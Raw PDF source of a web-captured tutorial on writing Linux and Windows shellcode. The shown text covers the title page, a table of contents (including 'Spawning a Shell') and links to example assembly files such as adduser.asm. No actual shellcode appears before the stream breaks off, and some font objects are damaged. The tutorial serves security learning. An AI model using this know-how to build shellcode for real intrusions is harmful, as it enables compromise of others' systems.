%PDF-1.6%‚„œ”
1 0 obj<</Names 34 0 R/Outlines 5 0 R/Metadata 181 0 R/Pages 2 0 R/SpiderInfo 167 0 R/StructTreeRoot 7 0 R/Type/Catalog>>endobj2 0 obj<</Count 21/Type/Pages/Kids[83 0 R 82 0 R 109 0 R 133 0 R]>>endobj3 0 obj<</CreationDate(D:20070327075343-06'00')/Producer(Acrobat Web Capture 7.0)/ModDate(D:20070327075351-06'00')/Title(Shellcoding for Linux and Windows Tutorial)>>endobj5 0 obj<</First 179 0 R/Count 2/Last 179 0 R/Type/Outlines>>endobj7 0 obj<</K 9 0 R/ParentTree 12 0 R/ParentTreeNextKey 21/Type/StructTreeRoot/ClassMap 8 0 R>>endobj8 0 obj<</SpdrArt<</O/WebCapture>>>>endobj9 0 obj<</K 10 0 R/P 7 0 R/S/Document>>endobj10 0 obj<</C/SpdrArt/K[0<</MCID 0/Pg 38 0 R/Type/MCR>><</MCID 0/Pg 43 0 R/Type/MCR>><</MCID 0/Pg 51 0 R/Type/MCR>><</MCID 0/Pg 64 0 R/Type/MCR>><</MCID 0/Pg 67 0 R/Type/MCR>><</MCID 0/Pg 69 0 R/Type/MCR>><</MCID 0/Pg 72 0 R/Type/MCR>><</MCID 0/Pg 74 0 R/Type/MCR>><</MCID 0/Pg 78 0 R/Type/MCR>><</MCID 0/Pg 81 0 R/Type/MCR>><</MCID 0/Pg 94 0 R/Type/MCR>><</MCID 0/Pg 97 0 R/Type/MCR>><</MCID 0/Pg 101 0 R/Type/MCR>><</MCID 0/Pg 105 0 R/Type/MCR>><</MCID 0/Pg 108 0 R/Type/MCR>><</MCID 0/Pg 112 0 R/Type/MCR>><</MCID 0/Pg 118 0 R/Type/MCR>><</MCID 0/Pg 122 0 R/Type/MCR>><</MCID 0/Pg 125 0 R/Type/MCR>><</MCID 0/Pg 132 0 R/Type/MCR>>]/P 9 0 R/S/Article/T()/Pg 11 0 R>>endobj11 0 obj<</Annots 15 0 R/Parent 83 0 R/ID 173 0 R/StructParents 0/Contents 145 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 84 0 R/TT1 86 0 R/TT2 90 0 R/T1_0 88 0 R/T1_1 89 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj12 0 obj<</Nums[0 13 0 R 1 39 0 R 2 44 0 R 3 52 0 R 4 65 0 R 5 68 0 R 6 70 0 R 7 73 0 R 8 75 0 R 9 79 0 R 10 93 0 R 11 96 0 R 12 100 0 R 13 103 0 R 14 107 0 R 15 111 0 R 16 116 0 R 17 120 0 R 18 124 0 R 19 127 0 R 20 135 0 R]>>endobj13 0 obj[10 0 R]endobj14 0 obj<</Rect[253.471 644.712 358.529 657.218]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(mailto:shanna@uiuc.edu)/S/URI>>/Border[0 0 0]>>endobj15 0 obj[14 0 R 16 0 R 17 0 R 18 0 R 19 0 R 20 0 R 21 0 R 22 0 R 23 0 R 24 0 R 25 0 R 26 0 R 27 0 R 28 0 R 29 0 R 30 0 R 31 0 R 32 0 R 33 0 R]endobj16 0 obj<</Rect[372.536 629.036 526.62 641.543]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://www.sigmil.org/)/S/URI>>/Border[0 0 0]>>endobj17 0 obj<</Rect[64.3684 548.274 134.407 560.781]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊcl)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#cl)/S/URI>>/Border[0 0 0]>>endobj18 0 obj<</Rect[64.3684 532.599 246.468 545.106]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊfaq)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#faq)/S/URI>>/Border[0 0 0]>>endobj19 0 obj<</Rect[64.3684 516.924 218.452 529.431]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊbi)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#bi)/S/URI>>/Border[0 0 0]>>endobj20 0 obj<</Rect[64.3684 501.249 162.422 513.756]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊrt)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#rt)/S/URI>>/Border[0 0 0]>>endobj21 0 obj<</Rect[64.3684 485.574 162.422 498.081]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊot)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#ot)/S/URI>>/Border[0 0 0]>>endobj22 0 obj<</Rect[64.3684 469.898 183.433 482.405]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊls)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#ls)/S/URI>>/Border[0 0 0]>>endobj23 0 obj<</Rect[134.407 454.223 351.525 466.73]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊlinex1)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#linex1)/S/URI>>/Border[0 0 0]>>endobj24 0 obj<</Rect[134.407 438.548 302.498 451.055]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊlinex2)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#linex2)/S/URI>>/Border[0 0 0]>>endobj25 0 obj<</Rect[134.407 422.873 330.513 435.38]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊlinex3)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#linex3)/S/URI>>/Border[0 0 0]>>endobj26 0 obj<</Rect[64.3684 407.198 197.441 419.704]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊws)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#ws)/S/URI>>/Border[0 0 0]>>endobj27 0 obj<</Rect[134.407 391.522 365.532 404.029]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex1)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#win32ex1)/S/URI>>/Border[0 0 0]>>endobj28 0 obj<</Rect[134.407 375.847 372.536 388.354]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex2)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#win32ex2)/S/URI>>/Border[0 0 0]>>endobj29 0 obj<</Rect[134.407 360.172 442.574 372.679]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex3)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#win32ex3)/S/URI>>/Border[0 0 0]>>endobj30 0 obj<</Rect[64.3684 344.497 260.475 357.004]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊas)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#as)/S/URI>>/Border[0 0 0]>>endobj31 0 obj<</Rect[134.407 328.822 267.479 341.328]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊps)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#ps)/S/URI>>/Border[0 0 0]>>endobj32 0 obj<</Rect[64.3684 313.146 134.407 325.653]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊcon)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#con)/S/URI>>/Border[0 0 0]>>endobj33 0 obj<</Rect[64.3684 297.471 260.475 309.978]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</D(5‘`ˇ2Ësı5ŸO√¡yÊfr)/S/GoTo>>/PA<</URI(http://vividmachines.com/shellcode/shellcode.html#fr)/S/URI>>/Border[0 0 0]>>endobj34 0 obj<</IDS 177 0 R/Dests 35 0 R/URLS 178 0 R>>endobj35 0 obj<</Names[(5‘`ˇ2Ësı5ŸO√¡yÊas)117 0 R(5‘`ˇ2Ësı5ŸO√¡yÊbi)47 0 R(5‘`ˇ2Ësı5ŸO√¡yÊcl)36 0 R(5‘`ˇ2Ësı5ŸO√¡yÊcon)131 0 R(5‘`ˇ2Ësı5ŸO√¡yÊfaq)37 0 R(5‘`ˇ2Ësı5ŸO√¡yÊfr)130 0 R(5‘`ˇ2Ësı5ŸO√¡yÊlinex1)63 0 R(5‘`ˇ2Ësı5ŸO√¡yÊlinex2)66 0 R(5‘`ˇ2Ësı5ŸO√¡yÊlinex3)71 0 R(5‘`ˇ2Ësı5ŸO√¡yÊls)62 0 R(5‘`ˇ2Ësı5ŸO√¡yÊot)49 0 R(5‘`ˇ2Ësı5ŸO√¡yÊps)121 0 R(5‘`ˇ2Ësı5ŸO√¡yÊrt)48 0 R(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex1)77 0 R(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex2)80 0 R(5‘`ˇ2Ësı5ŸO√¡yÊwin32ex3)104 0 R(5‘`ˇ2Ësı5ŸO√¡yÊws)76 0 R]>>endobj36 0 obj[11 0 R/XYZ 0 279.628 null]endobj37 0 obj[11 0 R/XYZ 0 196.222 null]endobj38 0 obj<</Annots 41 0 R/Parent 83 0 R/ID 173 0 R/StructParents 1/Contents 146 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 90 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj39 0 obj[10 0 R]endobj40 0 obj<</Rect[183.433 735.304 309.502 747.811]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://www.metasploit.com/)/S/URI>>/Border[0 0 0]>>endobj41 0 obj[40 0 R 42 0 R]endobj42 0 obj<</Rect[50.3608 529.069 78.376 541.576]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://world.std.com/~slanning/asm/syscall_list.html)/S/URI>>/Border[0 0 0]>>endobj43 0 obj<</Annots 46 0 R/Parent 83 0 R/ID 173 0 R/StructParents 2/Contents 147 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R/T1_1 98 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj44 0 obj[10 0 R]endobj45 0 obj<</Rect[155.418 651.559 260.475 664.066]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(mailto:shanna@uiuc.edu)/S/URI>>/Border[0 0 0]>>endobj46 0 obj[45 0 R 50 0 R]endobj47 0 obj[43 0 R/XYZ 0 515.777 null]endobj48 0 obj[43 0 R/XYZ 0 253.793 null]endobj49 0 obj[43 0 R/XYZ 0 111.278 null]endobj50 0 obj<</Rect[41.6894 62.3671 97.7199 74.8739]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/odfhex.cpp)/S/URI>>/Border[0 0 0]>>endobj51 0 obj<</Annots 54 0 R/Parent 83 0 R/ID 173 0 R/StructParents 3/Contents 148 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 90 0 R/T1_0 88 0 R/T1_1 98 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj52 0 obj[10 0 R]endobj53 0 obj<</Rect[41.6894 753.656 90.7161 766.162]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/arwin.c)/S/URI>>/Border[0 0 0]>>endobj54 0 obj[53 0 R 55 0 R 56 0 R 57 0 R 58 0 R 59 0 R 60 0 R 61 0 R]endobj55 0 obj<</Rect[41.6894 722.121 146.747 734.628]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/shellcodetest.c)/S/URI>>/Border[0 0 0]>>endobj56 0 obj<</Rect[41.6894 690.586 97.7199 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/exit.asm)/S/URI>>/Border[0 0 0]>>endobj57 0 obj<</Rect[104.724 690.586 167.758 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/hello.asm)/S/URI>>/Border[0 0 0]>>endobj58 0 obj<</Rect[174.762 690.586 244.8 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/msgbox.asm)/S/URI>>/Border[0 0 0]>>endobj59 0 obj<</Rect[251.804 690.586 328.846 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/shellex.asm)/S/URI>>/Border[0 0 0]>>endobj60 0 obj<</Rect[335.85 690.586 398.884 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/sleep.asm)/S/URI>>/Border[0 0 0]>>endobj61 0 obj<</Rect[405.888 690.586 482.93 703.093]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://vividmachines.com/shellcode/adduser.asm)/S/URI>>/Border[0 0 0]>>endobj62 0 obj[51 0 R/XYZ 0 628.868 null]endobj63 0 obj[51 0 R/XYZ 0 370.136 null]endobj64 0 obj<</Parent 83 0 R/ID 173 0 R/StructParents 4/Contents 149 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 90 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj65 0 obj[10 0 R]endobj66 0 obj[64 0 R/XYZ 0 475.741 null]endobj67 0 obj<</Parent 82 0 R/ID 173 0 R/StructParents 5/Contents 150 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj68 0 obj[10 0 R]endobj69 0 obj<</Parent 82 0 R/ID 173 0 R/StructParents 6/Contents 151 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 113 0 R/TT3 90 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj70 0 obj[10 0 R]endobj71 0 obj[69 0 R/XYZ 0 667.442 null]endobj72 0 obj<</Parent 82 0 R/ID 173 0 R/StructParents 7/Contents 152 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj73 0 obj[10 0 R]endobj74 0 obj<</Parent 82 0 R/ID 173 0 R/StructParents 8/Contents 153 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 90 0 R/T1_0 88 0 R/T1_1 89 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj75 0 obj[10 0 R]endobj76 0 obj[74 0 R/XYZ 0 535.87 null]endobj77 0 obj[74 0 R/XYZ 0 500.633 null]endobj78 0 obj<</Parent 82 0 R/ID 173 0 R/StructParents 9/Contents 154 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 90 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj79 0 obj[10 0 R]endobj80 0 obj[78 0 R/XYZ 0 446.081 null]endobj81 0 obj<</Parent 109 0 R/ID 173 0 R/StructParents 10/Contents 155 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj82 0 obj<</Parent 2 0 R/Count 5/Type/Pages/Kids[67 0 R 69 0 R 72 0 R 74 0 R 78 0 R]>>endobj83 0 obj<</Parent 2 0 R/Count 5/Type/Pages/Kids[11 0 R 38 0 R 43 0 R 51 0 R 64 0 R]>>endobj84 0 obj<</Subtype/TrueType/FontDescriptor 85 0 R/LastChar 255/Widths[600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600]/BaseFont/CourierNew,Bold/FirstChar 0/Encoding/WinAnsiEncoding/Type/Font>>endobj85 0 obj<</StemV 100/FontName/CourierNew,Bold/FontStretch/Normal/FontWeight 700/Flags 34/Descent -710/FontBBox[-46 -710 702 1221]/Ascent 1221/FontFamily(Courier New)/CapHeight 592/XHeight 443/Type/FontDescriptor/ItalicAngle 0>>endobj86 0 obj<</Subtype/TrueType/FontDescriptor 87 0 R/LastChar 255/WidthsaseFont/CourierNew/FirstChar 0/Encoding/WinAnsiEncoding/Type/Font>>endobj87 0 obj<</StemV 40/FontName/CourierNew/FontStretch/Normal/FontWeight 400/Flags 34/Descent -680/FontBBox[-21 -680 638 1021]/Ascent 1021/FontFamily(Courier New)/CapHeight 571/XHeight 423/Type/FontDescriptor/ItalicAngle 0>>endobj88 0 obj<</Subtype/Type1/BaseFont/Times-Roman/Encoding/WinAnsiEncoding/Type/Font>>endobj89 0 obj<</Subtype/Type1/BaseFont/Courier/Encoding/WinAnsiEncoding/Type/Font>>endobj90 0 obj<</Subtype/TrueType/FontDescriptor 91 0 R/LastChar 255/Widths[600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600 600]/BaseFont/CourierNew,Italic/FirstChar 0/Encoding/WinAnsiEncoding/Type/Font>>endobj91 0 obj<</StemV 40/FontName/CourierNew,Italic/FontStretch/Normal/FontWeight 400/Flags 98/Descent -274/FontBBox[-67 -274 800 1000]/Ascent 1000/FontFamily(Courier New)/CapHeight 571/XHeight 423/Type/FontDescriptor/ItalicAngle -12>>endobj93 0 obj[10 0 R]endobj94 0 obj<</Parent 109 0 R/ID 173 0 R/StructParents 11/Contents 157 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj96 0 obj[10 0 R]endobj97 0 obj<</Parent 109 0 R/ID 173 0 R/StructParents 12/Contents 158 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj98 0 obj<</Subtype/Type1/BaseFont/ZapfDingbats/Type/Font>>endobj100 0 obj[10 0 R]endobj101 0 obj<</Parent 109 0 R/ID 173 0 R/StructParents 13/Contents 159 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj103 0 obj[10 0 R]endobj104 0 obj[101 0 R/XYZ 0 296.243 null]endobj105 0 obj<</Parent 109 0 R/ID 173 0 R/StructParents 14/Contents 160 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 90 0 R/TT2 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj107 0 obj[10 0 R]endobj108 0 obj<</Parent 133 0 R/ID 173 0 R/StructParents 15/Contents 161 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj109 0 obj<</Parent 2 0 R/Count 5/Type/Pages/Kids[81 0 R 94 0 R 97 0 R 101 0 R 105 0 R]>>endobj111 0 obj[10 0 R]endobj112 0 obj<</Parent 133 0 R/ID 173 0 R/StructParents 16/Contents 162 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj113 0 obj<</Subtype/TrueType/FontDescriptor 114 0 R/LastChar 255/WidthsaseFont/CourierNew,BoldItalic/FirstChar 0/Encoding/WinAnsiEncoding/Type/Font>>endobj114 0 obj<</StemV 100/FontName/CourierNew,BoldItalic/FontStretch/Normal/FontWeight 700/Flags 98/Descent -377/FontBBox[-103 -377 836 1004]/Ascent 1004/FontFamily(Courier New)/CapHeight 592/XHeight 443/Type/FontDescriptor/ItalicAngle -12>>endobj116 0 obj[10 0 R]endobj117 0 obj[112 0 R/XYZ 0 119.889 null]endobj118 0 obj<</Parent 133 0 R/ID 173 0 R/StructParents 17/Contents 163 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 84 0 R/TT2 113 0 R/T1_0 88 0 R/T1_1 89 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj120 0 obj[10 0 R]endobj121 0 obj[118 0 R/XYZ 0 737.48 null]endobj122 0 obj<</Parent 133 0 R/ID 173 0 R/StructParents 18/Contents 164 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/T1_0 88 0 R/T1_1 89 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj124 0 obj[10 0 R]endobj125 0 obj<</Annots 129 0 R/Parent 133 0 R/ID 173 0 R/StructParents 19/Contents 165 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/TT1 90 0 R/TT2 84 0 R/T1_0 88 0 R/T1_1 89 0 R/T1_2 98 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj127 0 obj[10 0 R]endobj128 0 obj<</Rect[162.422 417.651 246.468 430.158]/Subtype/Link/BS<</S/S/W 0/Type/Border>>/A<</URI(http://www.phiral.com/research/dissembler_0.9.tgz)/S/URI>>/Border[0 0 0]>>endobj129 0 obj[128 0 R]endobj130 0 obj[125 0 R/XYZ 0 351.261 null]endobj131 0 obj[125 0 R/XYZ 0 166.081 null]endobj132 0 obj<</Parent 133 0 R/ID 173 0 R/StructParents 20/Contents 156 0 R/PZ 1.19934/MediaBox[0.0 0.0 612.0 792.0]/Resources<</Font<</TT0 86 0 R/T1_0 88 0 R>>/ProcSet[/PDF/Text]>>/Type/Page>>endobj133 0 obj<</Parent 2 0 R/Count 6/Type/Pages/Kids[108 0 R 112 0 R 118 0 R 122 0 R 125 0 R 132 0 R]>>endobj135 0 obj[10 0 R]endobj145 0 obj<</Length 5221>>stream
/Artifact <</Attached [/Top ]/Type /Pagination /BBox [18 779.4959 582 787 ]>>BDC 
0 0 0 rg
0 i 
BT
/T1_0 1 Tf
0 Tc 0 Tw 0  Ts 100  Tz 0 Tr 7.5041 0 0 7.5041 18 781.3052 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
ET
EMC 
/Article <</MCID 0 >>BDC 
q
0 18 612 756 re
W* n
BT
/TT0 1 Tf
16.1626 0 0 16.1626 102.3506 739.6516 Tm
(Shellcoding for Linux and Windows Tutorial)Tj
/TT1 1 Tf
11.673 0 0 11.673 165.9237 708.0767 Tm
(with example windows and linux shellcode)Tj
7.8 -2.557 Td
(by steve hanna )Tj
-3 -1.2 Td
(http://vividmachines.com )Tj
ET
0 0 1 RG
0.56 w 10 M 0 j 0 J []0 d 
253.471 648.531 m
358.529 648.531 l
S
0 0 1 rg
BT
/TT1 1 Tf
11.673 0 0 11.673 253.4714 650.2119 Tm
(shanna@uiuc.edu)Tj
0 0 0 rg
( )Tj
-14.4 -1.343 Td
(for premier security research check out: )Tj
ET
372.536 632.856 m
526.62 632.856 l
S
0 0 1 rg
BT
/TT1 1 Tf
11.673 0 0 11.673 372.5362 634.5367 Tm
(http://www.sigmil.org/)Tj
0 0 0 rg
( )Tj
/TT0 1 Tf
16.1626 0 0 16.1626 8.3379 599.3572 Tm
(Table of Contents)Tj
/T1_0 1 Tf
11.673 0 0 11.673 173.1969 599.3572 Tm
(  )Tj
/T1_1 1 Tf
-14.123 -2.868 Td
(        )Tj
0 -1.2 TD
(        )Tj
ET
0.357 w 
64.368 550.795 m
134.407 550.795 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 551.8666 Tm
(Change Log)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 535.12 m
246.468 535.12 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 536.1914 Tm
(Frequently Asked Questions)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 519.445 m
218.452 519.445 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 520.5162 Tm
(Background Information)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 503.769 m
162.422 503.769 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 504.841 Tm
(Required Tools)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 488.094 m
162.422 488.094 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 489.1658 Tm
(Optional Tools)Tj
0 0 0 rg
-4.8 -1.343 Td
(        )Tj
ET
64.368 472.419 m
183.433 472.419 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 473.4906 Tm
(Linux Shellcoding)Tj
0 0 0 rg
-4.8 -1.343 Td
(                - )Tj
ET
134.407 456.744 m
351.525 456.744 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 457.8154 Tm
(Example 1 - Making a Quick Exit)Tj
0 0 0 rg
-10.8 -1.343 Td
(                - )Tj
ET
134.407 441.069 m
302.498 441.069 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 442.1402 Tm
(Example 2 - Saying Hello)Tj
0 0 0 rg
-10.8 -1.343 Td
(                - )Tj
ET
134.407 425.393 m
330.513 425.393 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 426.465 Tm
(Example 3 - Spawning a Shell)Tj
0 0 0 rg
-10.8 -1.343 Td
(        )Tj
ET
64.368 409.718 m
197.441 409.718 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 64.3684 410.7897 Tm
(Windows Shellcoding)Tj
0 0 0 rg
-4.8 -1.343 Td
(                - )Tj
ET
134.407 394.043 m
365.532 394.043 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 395.1145 Tm
(Example 1 - Sleep is for the Weak)Tj
0 0 0 rg
-10.8 -1.343 Td
(                - )Tj
ET
134.407 378.368 m
372.536 378.368 l
S
0 0 1 rg
BT
/T1_1 1 Tf
11.673 0 0 11.673 134.4065 379.4393 Tm
(Example 2 - A Message to say "Hey")Tj
0 0 0 rg
-10.8 -1.343 Td
(                - )Tj
ET
134.407 362.693 m
